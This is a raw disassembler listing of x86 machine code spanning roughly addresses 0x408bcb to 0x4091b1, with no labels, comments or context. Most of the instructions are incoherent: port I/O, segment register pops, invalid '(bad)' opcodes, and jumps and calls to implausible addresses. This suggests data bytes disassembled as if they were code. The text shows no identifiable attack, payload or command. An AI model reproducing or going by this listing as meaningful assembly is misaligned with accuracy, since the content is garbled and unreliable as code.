  408bcb:	98                   	cwtl
  408bcc:	94                   	xchg   %eax,%esp
  408bcd:	90                   	nop
  408bce:	40                   	inc    %eax
  408bcf:	da 45 28             	fiaddl 0x28(%ebp)
  408bd2:	5d                   	pop    %ebp
  408bd3:	68 01 f9 ea d1       	push   $0xd1eaf901
  408bd8:	01 04 fe             	add    %eax,(%esi,%edi,8)
  408bdb:	1f                   	pop    %ds
  408bdc:	7c b8                	jl     0x408b96
  408bde:	29 65 6d             	sub    %esp,0x6d(%ebp)
  408be1:	39 1d 61 01 39 61    	cmp    %ebx,0x61390161
  408be7:	ed                   	in     (%dx),%eax
  408be8:	98                   	cwtl
  408be9:	fd                   	std
  408bea:	1a 6f 60             	sbb    0x60(%edi),%ch
  408bed:	01 39                	add    %edi,(%ecx)
  408bef:	d0 fc                	sar    $1,%ah
  408bf1:	e0 d9                	loopne 0x408bcc
  408bf3:	f0 62 8f 65 1e 71 0b 	lock bound %ecx,0xb711e65(%edi)
  408bfa:	4c                   	dec    %esp
  408bfb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408bfc:	98                   	cwtl
  408bfd:	b9 97 13 1c 51       	mov    $0x511c1397,%ecx
  408c02:	35 12 b8 f3 91       	xor    $0x91f3b812,%eax
  408c07:	a1 65 2e d7 5f       	mov    0x5fd72e65,%eax
  408c0c:	09 74 61 f5          	or     %esi,-0xb(%ecx,%eiz,2)
  408c10:	3d 14 1d 10 1f       	cmp    $0x1f101d14,%eax
  408c15:	e0 d1                	loopne 0x408be8
  408c17:	81 a4 84 77 ad 3e 65 	andl   $0x97b183ec,0x653ead77(%esp,%eax,4)
  408c1e:	ec 83 b1 97 
  408c22:	ec                   	in     (%dx),%al
  408c23:	40                   	inc    %eax
  408c24:	24 9e                	and    $0x9e,%al
  408c26:	30 01                	xor    %al,(%ecx)
  408c28:	42                   	inc    %edx
  408c29:	17                   	pop    %ss
  408c2a:	1b 42 78             	sbb    0x78(%edx),%eax
  408c2d:	ae                   	scas   %es:(%edi),%al
  408c2e:	18 46 10             	sbb    %al,0x10(%esi)
  408c31:	59                   	pop    %ecx
  408c32:	2f                   	das
  408c33:	bd a4 b1 2b 55       	mov    $0x552bb1a4,%ebp
  408c38:	e6 18                	out    %al,$0x18
  408c3a:	aa                   	stos   %al,%es:(%edi)
  408c3b:	05 c0 ec 8c bd       	add    $0xbd8cecc0,%eax
  408c40:	03 09                	add    (%ecx),%ecx
  408c42:	05 20 17 0e 07       	add    $0x70e1720,%eax
  408c47:	59                   	pop    %ecx
  408c48:	68 65 81 24 78       	push   $0x78248165
  408c4d:	87 20                	xchg   %esp,(%eax)
  408c4f:	f5                   	cmc
  408c50:	22 ed                	and    %ch,%ch
  408c52:	16                   	push   %ss
  408c53:	c8 b8 5d 04          	enter  $0x5db8,$0x4
  408c57:	21 3b                	and    %edi,(%ebx)
  408c59:	0a 7e 20             	or     0x20(%esi),%bh
  408c5c:	0f 33                	rdpmc
  408c5e:	00 b3 90 21 30 b8    	add    %dh,-0x47cfde70(%ebx)
  408c64:	76 0e                	jbe    0x408c74
  408c66:	2f                   	das
  408c67:	16                   	push   %ss
  408c68:	42                   	inc    %edx
  408c69:	35 6e 7c 9e 18       	xor    $0x189e7c6e,%eax
  408c6e:	6c                   	insb   (%dx),%es:(%edi)
  408c6f:	c2 33 57             	ret    $0x5733
  408c72:	1b 80 73 a4 84 0d    	sbb    0xd84a473(%eax),%eax
  408c78:	ab                   	stos   %eax,%es:(%edi)
  408c79:	ce                   	into
  408c7a:	c9                   	leave
  408c7b:	14 5b                	adc    $0x5b,%al
  408c7d:	2a 67 a1             	sub    -0x5f(%edi),%ah
  408c80:	6c                   	insb   (%dx),%es:(%edi)
  408c81:	89 dc                	mov    %ebx,%esp
  408c83:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408c84:	1f                   	pop    %ds
  408c85:	4a                   	dec    %edx
  408c86:	84 48 12             	test   %cl,0x12(%eax)
  408c89:	f0 62 ea 50          	lock (bad) {rz-bad},{%k6}{z}
  408c8d:	f6 7b 84             	idivb  -0x7c(%ebx)
  408c90:	e9 74 d4 9f 98       	jmp    0x98e06109
  408c95:	d2 05 dd 3b db d8    	rolb   %cl,0xd8db3bdd
  408c9b:	11 bc 2f 90 05 3b 94 	adc    %edi,-0x6bc4fa70(%edi,%ebp,1)
  408ca2:	23 03                	and    (%ebx),%eax
  408ca4:	b6 33                	mov    $0x33,%dh
  408ca6:	4b                   	dec    %ebx
  408ca7:	22 70 31             	and    0x31(%eax),%dh
  408caa:	d8 d8                	fcomp  %st(0)
  408cac:	c8 37 69 24          	enter  $0x6937,$0x24
  408cb0:	1f                   	pop    %ds
  408cb1:	52                   	push   %edx
  408cb2:	d4 8c                	aam    $0x8c
  408cb4:	92                   	xchg   %eax,%edx
  408cb5:	0c c8                	or     $0xc8,%al
  408cb7:	d4 94                	aam    $0x94
  408cb9:	c3                   	ret
  408cba:	bb 40 46 98 86       	mov    $0x86984640,%ebx
  408cbf:	c3                   	ret
  408cc0:	a8 8b                	test   $0x8b,%al
  408cc2:	31 84 f3 c5 39 0d 09 	xor    %eax,0x90d39c5(%ebx,%esi,8)
  408cc9:	0b 18                	or     (%eax),%ebx
  408ccb:	f9                   	stc
  408ccc:	81 10 bb 8b d3 0c    	adcl   $0xcd38bbb,(%eax)
  408cd2:	24 6b                	and    $0x6b,%al
  408cd4:	b8 bf 81 3d 54       	mov    $0x543d81bf,%eax
  408cd9:	02 2f                	add    (%edi),%ch
  408cdb:	c1 1a f6             	rcrl   $0xf6,(%edx)
  408cde:	22 db                	and    %bl,%bl
  408ce0:	ab                   	stos   %eax,%es:(%edi)
  408ce1:	11 a3 cc 05 0b d8    	adc    %esp,-0x27f4fa34(%ebx)
  408ce7:	0f 2c c9             	cvttps2pi %xmm1,%mm1
  408cea:	8c 52 22             	mov    %ss,0x22(%edx)
  408ced:	ef                   	out    %eax,(%dx)
  408cee:	b8 c3 9d 2a 60       	mov    $0x602a9dc3,%eax
  408cf3:	c4 42 31             	les    0x31(%edx),%eax
  408cf6:	4c                   	dec    %esp
  408cf7:	5b                   	pop    %ebx
  408cf8:	4a                   	dec    %edx
  408cf9:	6e                   	outsb  %ds:(%esi),(%dx)
  408cfa:	65 40                	gs inc %eax
  408cfc:	78 e4                	js     0x408ce2
  408cfe:	65 66 c8 1c 32 20    	gs enterw $0x321c,$0x20
  408d04:	23 c8                	and    %eax,%ecx
  408d06:	c8 15 43 c6          	enter  $0x4315,$0xc6
  408d0a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408d0b:	cc                   	int3
  408d0c:	49                   	dec    %ecx
  408d0d:	a0 dd 9c f3 04       	mov    0x4f39cdd,%al
  408d12:	88 bd 2b 23 14 b9    	mov    %bh,-0x46ebdcd5(%ebp)
  408d18:	87 19                	xchg   %ebx,(%ecx)
  408d1a:	07                   	pop    %es
  408d1b:	63 49 bd             	arpl   %ecx,-0x43(%ecx)
  408d1e:	20 a6 aa 23 a0 20    	and    %ah,0x20a023aa(%esi)
  408d24:	e3 53                	jecxz  0x408d79
  408d26:	c8 b8 e6 24          	enter  $0xe6b8,$0x24
  408d2a:	66 b8 fc 2d          	mov    $0x2dfc,%ax
  408d2e:	17                   	pop    %ss
  408d2f:	2f                   	das
  408d30:	84 fd                	test   %bh,%ch
  408d32:	23 dd                	and    %ebp,%ebx
  408d34:	b8 fe ed 31 db       	mov    $0xdb31edfe,%eax
  408d39:	40                   	inc    %eax
  408d3a:	46                   	inc    %esi
  408d3b:	16                   	push   %ss
  408d3c:	4c                   	dec    %esp
  408d3d:	06                   	push   %es
  408d3e:	37                   	aaa
  408d3f:	c4                   	(bad)
  408d40:	c4 83 e4 87 64 c4    	les    -0x3b9b781c(%ebx),%eax
  408d46:	24 27                	and    $0x27,%al
  408d48:	b8 11 66 23 4b       	mov    $0x4b236611,%eax
  408d4d:	e6 60                	out    %al,$0x60
  408d4f:	82 15 22 88 8c 8c 91 	adcb   $0x91,0x8c8c8822
  408d56:	31 60 21             	xor    %esp,0x21(%eax)
  408d59:	61                   	popa
  408d5a:	01 25 bc 6f c6 96    	add    %esp,0x96c66fbc
  408d60:	c0 c3 5b             	rol    $0x5b,%bl
  408d63:	d3 3c 2e             	sarl   %cl,(%esi,%ebp,1)
  408d66:	20 5c c8 d8          	and    %bl,-0x28(%eax,%ecx,8)
  408d6a:	98                   	cwtl
  408d6b:	3c 98                	cmp    $0x98,%al
  408d6d:	98                   	cwtl
  408d6e:	2e 16                	cs push %ss
  408d70:	42                   	inc    %edx
  408d71:	3e 2c 93             	ds sub $0x93,%al
  408d74:	bb b8 22 2e cd       	mov    $0xcd2e22b8,%ebx
  408d79:	1c 36                	sbb    $0x36,%al
  408d7b:	21 c2                	and    %eax,%edx
  408d7d:	0b a0 d7 b3 26 1c    	or     0x1c26b3d7(%eax),%esp
  408d83:	92                   	xchg   %eax,%edx
  408d84:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408d85:	25 56 dc 26 b2       	and    $0xb226dc56,%eax
  408d8a:	9d                   	popf
  408d8b:	84 61 06             	test   %ah,0x6(%ecx)
  408d8e:	f0 40                	lock inc %eax
  408d90:	2c 44                	sub    $0x44,%al
  408d92:	c4 06                	les    (%esi),%eax
  408d94:	36 64 2f             	ss fs das
  408d97:	05 38 38 7c cc       	add    $0xcc7c3838,%eax
  408d9c:	0e                   	push   %cs
  408d9d:	2d 09 e4 8d 0e       	sub    $0xe8de409,%eax
  408da2:	fc                   	cld
  408da3:	86 84 59 ff 78 0c ea 	xchg   %al,-0x15f38701(%ecx,%ebx,2)
  408daa:	1b 20                	sbb    (%eax),%esp
  408dac:	00 6f 49             	add    %ch,0x49(%edi)
  408daf:	8d b4 84 0a 9d 85 ef 	lea    -0x107a62f6(%esp,%eax,4),%esi
  408db6:	25 3c 38 ba 7e       	and    $0x7eba383c,%eax
  408dbb:	34 8f                	xor    $0x8f,%al
  408dbd:	88 66 f5             	mov    %ah,-0xb(%esi)
  408dc0:	62 97 b7 b1 5c 2c    	bound  %edx,0x2c5cb1b7(%edi)
  408dc6:	c4 c5 57 5b          	(bad)
  408dca:	cd 38                	int    $0x38
  408dcc:	f1                   	int1
  408dcd:	00 e8                	add    %ch,%al
  408dcf:	e9 69 ba 3b b6       	jmp    0xb67c483d
  408dd4:	2c 15                	sub    $0x15,%al
  408dd6:	0e                   	push   %cs
  408dd7:	e2 00                	loop   0x408dd9
  408dd9:	0f c1 ea             	xadd   %ebp,%edx
  408ddc:	10 12                	adc    %dl,(%edx)
  408dde:	fc                   	cld
  408ddf:	62 55 80             	bound  %edx,-0x80(%ebp)
  408de2:	98                   	cwtl
  408de3:	2f                   	das
  408de4:	1e                   	push   %ds
  408de5:	f1                   	int1
  408de6:	0b 0c d8             	or     (%eax,%ebx,8),%ecx
  408de9:	f6 11                	notb   (%ecx)
  408deb:	e1 52                	loope  0x408e3f
  408ded:	bc 14 b4 84 6b       	mov    $0x6b84b414,%esp
  408df2:	b0 90                	mov    $0x90,%al
  408df4:	72 5f                	jb     0x408e55
  408df6:	67 9a 20 91 e5 1b 98 	addr16 lcall $0x1198,$0x1be59120
  408dfd:	11 
  408dfe:	8f                   	(bad)
  408dff:	3c c0                	cmp    $0xc0,%al
  408e01:	0e                   	push   %cs
  408e02:	4d                   	dec    %ebp
  408e03:	36 78 05             	ss js  0x408e0b
  408e06:	e0 80                	loopne 0x408d88
  408e08:	07                   	pop    %es
  408e09:	0a 62 13             	or     0x13(%edx),%ah
  408e0c:	f6 10                	notb   (%eax)
  408e0e:	be 8b 1d 3d 4d       	mov    $0x4d3d1d8b,%esi
  408e13:	02 4c 79 0b          	add    0xb(%ecx,%edi,2),%cl
  408e17:	24 f4                	and    $0xf4,%al
  408e19:	6c                   	insb   (%dx),%es:(%edi)
  408e1a:	5c                   	pop    %esp
  408e1b:	16                   	push   %ss
  408e1c:	12 e2                	adc    %dl,%ah
  408e1e:	7c a2                	jl     0x408dc2
  408e20:	0e                   	push   %cs
  408e21:	dc b2 ce c9 3a 4f    	fdivl  0x4f3ac9ce(%edx)
  408e27:	db 85 14 1c 41 c0    	fildl  -0x3fbee3ec(%ebp)
  408e2d:	7a 58                	jp     0x408e87
  408e2f:	61                   	popa
  408e30:	2c 01                	sub    $0x1,%al
  408e32:	fe                   	(bad)
  408e33:	f8                   	clc
  408e34:	7c 23                	jl     0x408e59
  408e36:	5f                   	pop    %edi
  408e37:	d7                   	xlat   %ds:(%ebx)
  408e38:	00 01                	add    %al,(%ecx)
  408e3a:	2e 0d 21 c8 91 01    	cs or  $0x191c821,%eax
  408e40:	c1 4d b1 11          	rorl   $0x11,-0x4f(%ebp)
  408e44:	41                   	inc    %ecx
  408e45:	7b cd                	jnp    0x408e14
  408e47:	e6 68                	out    %al,$0x68
  408e49:	59                   	pop    %ecx
  408e4a:	8a 05 08 c0 51 6c    	mov    0x6c51c008,%al
  408e50:	02 01                	add    (%ecx),%al
  408e52:	6e                   	outsb  %ds:(%esi),(%dx)
  408e53:	e8 be 66 c1 42       	call   0x4301f516
  408e58:	33 1c 59             	xor    (%ecx,%ebx,2),%ebx
  408e5b:	c1 81 ed 66 04 10 c2 	roll   $0xc2,0x100466ed(%ecx)
  408e62:	76 23                	jbe    0x408e87
  408e64:	8b e2                	mov    %edx,%esp
  408e66:	b5 27                	mov    $0x27,%ch
  408e68:	cd 7a                	int    $0x7a
  408e6a:	42                   	inc    %edx
  408e6b:	5e                   	pop    %esi
  408e6c:	85 3c 1d 67 50 67 05 	test   %edi,0x5675067(,%ebx,1)
  408e73:	72 09                	jb     0x408e7e
  408e75:	07                   	pop    %es
  408e76:	2b fc                	sub    %esp,%edi
  408e78:	53                   	push   %ebx
  408e79:	84 86 25 07 ec 2a    	test   %al,0x2aec0725(%esi)
  408e7f:	0c 22                	or     $0x22,%al
  408e81:	03 02                	add    (%edx),%eax
  408e83:	45                   	inc    %ebp
  408e84:	5c                   	pop    %esp
  408e85:	d2 b9 90 f4 f5 e1    	sarb   %cl,-0x1e0a0b70(%ecx)
  408e8b:	75 28                	jne    0x408eb5
  408e8d:	41                   	inc    %ecx
  408e8e:	b0 64                	mov    $0x64,%al
  408e90:	f3 9c                	repz pushf
  408e92:	e5 80                	in     $0x80,%eax
  408e94:	0c c8                	or     $0xc8,%al
  408e96:	e6 ea                	out    %al,$0xea
  408e98:	d6                   	salc
  408e99:	84 10                	test   %dl,(%eax)
  408e9b:	72 65                	jb     0x408f02
  408e9d:	47                   	inc    %edi
  408e9e:	d8 3f                	fdivrs (%edi)
  408ea0:	30 b3 d3 14 c5 26    	xor    %dh,0x26c514d3(%ebx)
  408ea6:	e9 14 29 12 b8       	jmp    0xb852b7bf
  408eab:	9c                   	pushf
  408eac:	06                   	push   %es
  408ead:	ca ce 10             	lret   $0x10ce
  408eb0:	f2 72 e3             	bnd jb 0x408e96
  408eb3:	3d 2e 00 3b 10       	cmp    $0x103b002e,%eax
  408eb8:	f6 12                	notb   (%edx)
  408eba:	68 70 2a 07 f4       	push   $0xf4072a70
  408ebf:	85 0d 85 3c 42 68    	test   %ecx,0x68423c85
  408ec5:	74 83                	je     0x408e4a
  408ec7:	44                   	inc    %esp
  408ec8:	c8 29 1b f4          	enter  $0x1b29,$0xf4
  408ecc:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  408ecd:	68 09 8e 41 c8       	push   $0xc8418e09
  408ed2:	d9 39                	fnstcw (%ecx)
  408ed4:	f8                   	clc
  408ed5:	70 60                	jo     0x408f37
  408ed7:	17                   	pop    %ss
  408ed8:	72 f3                	jb     0x408ecd
  408eda:	69 5f a4 b6 42 a0 23 	imul   $0x23a042b6,-0x5c(%edi),%ebx
  408ee1:	3c 0c                	cmp    $0xc,%al
  408ee3:	69 c1 2a 72 20 a4    	imul   $0xa420722a,%ecx,%eax
  408ee9:	17                   	pop    %ss
  408eea:	3e 69 3b 2b 09 48 0e 	imul   $0xe48092b,%ds:(%ebx),%edi
  408ef1:	c9                   	leave
  408ef2:	c8 a0 9c 71          	enter  $0x9ca0,$0x71
  408ef6:	69 44 d8 05 36 33 a3 	imul   $0x7aa33336,0x5(%eax,%ebx,8),%eax
  408efd:	7a 
  408efe:	57                   	push   %edi
  408eff:	20 17                	and    %dl,(%edi)
  408f01:	d9 fc                	frndint
  408f03:	f2 d6                	repnz salc
  408f05:	0b 5e 60             	or     0x60(%esi),%ebx
  408f08:	a1 b0 6a 77 f2       	mov    0xf2776ab0,%eax
  408f0d:	41                   	inc    %ecx
  408f0e:	6a 0f                	push   $0xf
  408f10:	c2 ae 42             	ret    $0x42ae
  408f13:	76 7a                	jbe    0x408f8f
  408f15:	2e 71 6b             	jno,pn 0x408f83
  408f18:	42                   	inc    %edx
  408f19:	0e                   	push   %cs
  408f1a:	08 f4                	or     %dh,%ah
  408f1c:	33 01                	xor    (%ecx),%eax
  408f1e:	89 93 8c 27 5b 0a    	mov    %edx,0xa5b278c(%ebx)
  408f24:	6b a4 ac 6a 8f 18 af 	imul   $0xffffffb2,-0x50e77096(%esp,%ebp,4),%esp
  408f2b:	b2 
  408f2c:	0b 49 3a             	or     0x3a(%ecx),%ecx
  408f2f:	e8 6a 9b 8c a5       	call   0xa5cd2a9e
  408f34:	ec                   	in     (%dx),%al
  408f35:	40                   	inc    %eax
  408f36:	2d 3e 4d fc 15       	sub    $0x15fc4d3e,%eax
  408f3b:	81 ec 9e 8f d1 41    	sub    $0x41d18f9e,%esp
  408f41:	8b 15 52 91 25 6b    	mov    0x6b259152,%edx
  408f47:	d8 21                	fsubs  (%ecx)
  408f49:	b0 73                	mov    $0x73,%al
  408f4b:	52                   	push   %edx
  408f4c:	43                   	inc    %ebx
  408f4d:	61                   	popa
  408f4e:	6b 9a 44 08 86 40 41 	imul   $0x41,0x40860844(%edx),%ebx
  408f55:	32 28                	xor    (%eax),%ch
  408f57:	6c                   	insb   (%dx),%es:(%edi)
  408f58:	8a e4                	mov    %ah,%ah
  408f5a:	9e                   	sahf
  408f5b:	6b dd 97             	imul   $0xffffff97,%ebp,%ebx
  408f5e:	2a 79 01             	sub    0x1(%ecx),%bh
  408f61:	c2 32 1d             	ret    $0x1d32
  408f64:	6c                   	insb   (%dx),%es:(%edi)
  408f65:	c0 18 81             	rcrb   $0x81,(%eax)
  408f68:	bc 5c 6c 6f 2f       	mov    $0x2f6f6c5c,%esp
  408f6d:	02 9d 50 f3 a8 77    	add    0x77a8f350(%ebp),%bl
  408f73:	06                   	push   %es
  408f74:	72 12                	jb     0x408f88
  408f76:	ec                   	in     (%dx),%al
  408f77:	76 23                	jbe    0x408f9c
  408f79:	0e                   	push   %cs
  408f7a:	51                   	push   %ecx
  408f7b:	bb 32 6c 5b 7c       	mov    $0x7c5b6c32,%ebx
  408f80:	bc 19 05 ab cf       	mov    $0xcfab0519,%esp
  408f85:	b2 05                	mov    $0x5,%dl
  408f87:	3c 90                	cmp    $0x90,%al
  408f89:	97                   	xchg   %eax,%edi
  408f8a:	04 28                	add    $0x28,%al
  408f8c:	aa                   	stos   %al,%es:(%edi)
  408f8d:	03 86 01 32 e8 99    	add    -0x6617cdff(%esi),%eax
  408f93:	87 78 fe             	xchg   %edi,-0x2(%eax)
  408f96:	05 ed 90 c2 41       	add    $0x41c290ed,%eax
  408f9b:	6f                   	outsl  %ds:(%esi),(%dx)
  408f9c:	62 1e                	bound  %ebx,(%esi)
  408f9e:	d7                   	xlat   %ds:(%ebx)
  408f9f:	42                   	inc    %edx
  408fa0:	73 48                	jae    0x408fea
  408fa2:	23 db                	and    %ebx,%ebx
  408fa4:	27                   	daa
  408fa5:	74 74                	je     0x40901b
  408fa7:	02 2d 29 66 bf b3    	add    0xb3bf6629,%ch
  408fad:	14 8d                	adc    $0x8d,%al
  408faf:	6a 89                	push   $0xffffff89
  408fb1:	08 0d 0e f6 d3 50    	or     %cl,0x50d3f60e
  408fb7:	af                   	scas   %es:(%edi),%eax
  408fb8:	8d 4d 6b             	lea    0x6b(%ebp),%ecx
  408fbb:	15 ca 8b 0a 1d       	adc    $0x1d0a8bca,%eax
  408fc0:	85 66 09             	test   %esp,0x9(%esi)
  408fc3:	a1 53 2a 54 24       	mov    0x24542a53,%eax
  408fc8:	23 17                	and    (%edi),%edx
  408fca:	c8 58 16 bc          	enter  $0x1658,$0xbc
  408fce:	bc 29 70 63 b3       	mov    $0xb3637029,%esp
  408fd3:	0b 77 5e             	or     0x5e(%edi),%esi
  408fd6:	26 f5                	es cmc
  408fd8:	b4 64                	mov    $0x64,%ah
  408fda:	00 23                	add    %ah,(%ebx)
  408fdc:	77 09                	ja     0x408fe7
  408fde:	c8 ad b1 3f          	enter  $0xb1ad,$0x3f
  408fe2:	1e                   	push   %ds
  408fe3:	89 ca                	mov    %ecx,%edx
  408fe5:	41                   	inc    %ecx
  408fe6:	89 08                	mov    %ecx,(%eax)
  408fe8:	52                   	push   %edx
  408fe9:	19 9c 6c c5 0a 2f 18 	sbb    %ebx,0x182f0ac5(%esp,%ebp,2)
  408ff0:	84 44 06 b5          	test   %al,-0x4b(%esi,%eax,1)
  408ff4:	10 5a 06             	adc    %bl,0x6(%edx)
  408ff7:	4f                   	dec    %edi
  408ff8:	9d                   	popf
  408ff9:	ba 64 75 58 08       	mov    $0x8587564,%edx
  408ffe:	36 be 32 9c 58 58    	ss mov $0x58589c32,%esi
  409004:	40                   	inc    %eax
  409005:	12 28                	adc    (%eax),%ch
  409007:	3d da 90 84 2f       	cmp    $0x2f8490da,%eax
  40900c:	ed                   	in     (%dx),%eax
  40900d:	01 86 96 30 52 ec    	add    %eax,-0x13adcf6a(%esi)
  409013:	65 05 31 c5 5c 40    	gs add $0x405cc531,%eax
  409019:	44                   	inc    %esp
  40901a:	3a f5                	cmp    %ch,%dh
  40901c:	f0 f1                	lock int1
  40901e:	dc 47 06             	faddl  0x6(%edi)
  409021:	76 dc                	jbe    0x408fff
  409023:	bf 46 78 10 84       	mov    $0x84107846,%edi
  409028:	90                   	nop
  409029:	9c                   	pushf
  40902a:	67 9a 00 f2 64 48 9b 	addr16 lcall $0xa09b,$0x4864f200
  409031:	a0 
  409032:	87 ba 32 72 c8 c8    	xchg   %edi,-0x37378dce(%edx)
  409038:	b8 b8 85 b8 29       	mov    $0x29b885b8,%eax
  40903d:	61                   	popa
  40903e:	20 13                	and    %dl,(%ebx)
  409040:	b8 8e 21 27 24       	mov    $0x2427218e,%eax
  409045:	92                   	xchg   %eax,%edx
  409046:	b8 82 80 64 12       	mov    $0x12648082,%eax
  40904b:	1a c9                	sbb    %cl,%cl
  40904d:	bc 46 35 70 c6       	mov    $0xc6703546,%esp
  409052:	41                   	inc    %ecx
  409053:	26 84 31             	test   %dh,%es:(%ecx)
  409056:	58                   	pop    %eax
  409057:	bb 50 7c 03 59       	mov    $0x59037c50,%ebx
  40905c:	98                   	cwtl
  40905d:	ac                   	lods   %ds:(%esi),%al
  40905e:	92                   	xchg   %eax,%edx
  40905f:	be 20 99 16 1d       	mov    $0x1d169920,%esi
  409064:	de 20                	fisubs (%eax)
  409066:	c6                   	(bad)
  409067:	8d                   	lea    (bad),%edi
  409068:	fc                   	cld
  409069:	c6                   	(bad)
  40906a:	d3 6c 27 84          	shrl   %cl,-0x7c(%edi,%eiz,1)
  40906e:	6c                   	insb   (%dx),%es:(%edi)
  40906f:	15 dc 51 40 e3       	adc    $0xe34051dc,%eax
  409074:	21 24 a4             	and    %esp,(%esp,%eiz,4)
  409077:	81 18 e0 08 60 00    	sbbl   $0x6008e0,(%eax)
  40907d:	43                   	inc    %ebx
  40907e:	49                   	dec    %ecx
  40907f:	82 c0 78             	add    $0x78,%al
  409082:	98                   	cwtl
  409083:	70 32                	jo     0x4090b7
  409085:	ee                   	out    %al,(%dx)
  409086:	a1 06 00 2a 79       	mov    0x792a0006,%eax
  40908b:	80 10 f3             	adcb   $0xf3,(%eax)
  40908e:	32 46 e9             	xor    -0x17(%esi),%al
  409091:	96                   	xchg   %eax,%esi
  409092:	10 fb                	adc    %bh,%bl
  409094:	30 78 8b             	xor    %bh,-0x75(%eax)
  409097:	2e 1d 60 6c 04 e0    	cs sbb $0xe0046c60,%eax
  40909d:	e3 25                	jecxz  0x4090c4
  40909f:	06                   	push   %es
  4090a0:	19 ae 79 01 58 59    	sbb    %ebp,0x59580179(%esi)
  4090a6:	b9 f7 58 a5 c3       	mov    $0xc3a558f7,%ecx
  4090ab:	92                   	xchg   %eax,%edx
  4090ac:	0b 23                	or     (%ebx),%esp
  4090ae:	13 05 6d de 42 ca    	adc    0xca42de6d,%eax
  4090b4:	20 4e 60             	and    %cl,0x60(%esi)
  4090b7:	e2 18                	loop   0x4090d1
  4090b9:	ef                   	out    %eax,(%dx)
  4090ba:	90                   	nop
  4090bb:	1d c9 94 94 90       	sbb    $0x909494c9,%eax
  4090c0:	33 1b                	xor    (%ebx),%ebx
  4090c2:	62 90 ed 45 b6 4c    	bound  %edx,0x4cb645ed(%eax)
  4090c8:	ef                   	out    %eax,(%dx)
  4090c9:	b4 05                	mov    $0x5,%ah
  4090cb:	5d                   	pop    %ebp
  4090cc:	34 82                	xor    $0x82,%al
  4090ce:	04 94                	add    $0x94,%al
  4090d0:	38 b8 b5 59 22 1b    	cmp    %bh,0x1b2259b5(%eax)
  4090d6:	67 fb                	addr16 sti
  4090d8:	2f                   	das
  4090d9:	72 c0                	jb     0x40909b
  4090db:	60                   	pusha
  4090dc:	a3 c0 0d 48 c0       	mov    %eax,0xc0480dc0
  4090e1:	d9 b4 38 7e a4 ef 10 	fnstenv 0x10efa47e(%eax,%edi,1)
  4090e8:	84 95 f4 db a7 32    	test   %dl,0x32a7dbf4(%ebp)
  4090ee:	cb                   	lret
  4090ef:	66 b1 64             	data16 mov $0x64,%cl
  4090f2:	18 51 22             	sbb    %dl,0x22(%ecx)
  4090f5:	36 10 5e 21          	adc    %bl,%ss:0x21(%esi)
  4090f9:	bf 0b 50 f4 01       	mov    $0x1f4500b,%edi
  4090fe:	34 71                	xor    $0x71,%al
  409100:	d5 40                	aad    $0x40
  409102:	84 03                	test   %al,(%ebx)
  409104:	10 92 ae 95 3c 90    	adc    %dl,-0x6fc36a52(%edx)
  40910a:	4f                   	dec    %edi
  40910b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40910c:	9c                   	pushf
  40910d:	fe                   	(bad)
  40910e:	9c                   	pushf
  40910f:	fe                   	(bad)
  409110:	b7 a4                	mov    $0xa4,%bh
  409112:	7a e6                	jp     0x4090fa
  409114:	c8 fc 1a 0c          	enter  $0x1afc,$0xc
  409118:	14 20                	adc    $0x20,%al
  40911a:	49                   	dec    %ecx
  40911b:	71 b6                	jno    0x4090d3
  40911d:	fa                   	cli
  40911e:	44                   	inc    %esp
  40911f:	e2 45                	loop   0x409166
  409121:	b0 c7                	mov    $0xc7,%al
  409123:	24 a4                	and    $0xa4,%al
  409125:	00 15 5e 58 20 b9    	add    %dl,0xb920585e
  40912b:	ef                   	out    %eax,(%dx)
  40912c:	50                   	push   %eax
  40912d:	6d                   	insl   (%dx),%es:(%edi)
  40912e:	2a 72 6d             	sub    0x6d(%edx),%dh
  409131:	7b c0                	jnp    0x4090f3
  409133:	08 2c 74             	or     %ch,(%esp,%esi,2)
  409136:	f0 bd 61 01 8f 60    	lock mov $0x608f0161,%ebp
  40913c:	88 bb e3 f6 88 cd    	mov    %bh,-0x3277091d(%ebx)
  409142:	aa                   	stos   %al,%es:(%edi)
  409143:	17                   	pop    %ss
  409144:	05 31 0b 72 c8       	add    $0xc8720b31,%eax
  409149:	98                   	cwtl
  40914a:	5c                   	pop    %esp
  40914b:	70 5e                	jo     0x4091ab
  40914d:	34 c6                	xor    $0xc6,%al
  40914f:	b3 7f                	mov    $0x7f,%bl
  409151:	b3 c9                	mov    $0xc9,%bl
  409153:	70 20                	jo     0x409175
  409155:	05 b9 80 51 01       	add    $0x15180b9,%eax
  40915a:	4d                   	dec    %ebp
  40915b:	32 94 1d f6 d0 b9 10 	xor    0x10b9d0f6(%ebp,%ebx,1),%dl
  409162:	0e                   	push   %cs
  409163:	58                   	pop    %eax
  409164:	7c 1f                	jl     0x409185
  409166:	6c                   	insb   (%dx),%es:(%edi)
  409167:	c8 21 b7 45          	enter  $0xb721,$0x45
  40916b:	2a 3c 00             	sub    (%eax,%eax,1),%bh
  40916e:	78 e7                	js     0x409157
  409170:	14 c8                	adc    $0xc8,%al
  409172:	15 68 95 64 a4       	adc    $0xa4649568,%eax
  409177:	09 79 49             	or     %edi,0x49(%ecx)
  40917a:	bc c4 01 8d cb       	mov    $0xcb8d01c4,%esp
  40917f:	e9 66 04 66 ac       	jmp    0xaca695ea
  409184:	e4 06                	in     $0x6,%al
  409186:	68 40 38 a9 37       	push   $0x37a93840
  40918b:	b9 e8 8a a9 0f       	mov    $0xfa98ae8,%ecx
  409190:	c0 06 64             	rolb   $0x64,(%esi)
  409193:	18 4b 3c             	sbb    %cl,0x3c(%ebx)
  409196:	d3 6d 4e             	shrl   %cl,0x4e(%ebp)
  409199:	21 53 16             	and    %edx,0x16(%ebx)
  40919c:	56                   	push   %esi
  40919d:	1c 37                	sbb    $0x37,%al
  40919f:	55                   	push   %ebp
  4091a0:	29 46 42             	sub    %eax,0x42(%esi)
  4091a3:	b6 58                	mov    $0x58,%dh
  4091a5:	84 f1                	test   %dh,%cl
  4091a7:	e5 72                	in     $0x72,%eax
  4091a9:	19 f1                	sbb    %esi,%ecx
  4091ab:	64 74 36             	fs je  0x4091e4
  4091ae:	c7                   	(bad)
  4091af:	11 3b                	adc    %edi,(%ebx)
  4091b1:	91                   	xchg   %eax,%ecx
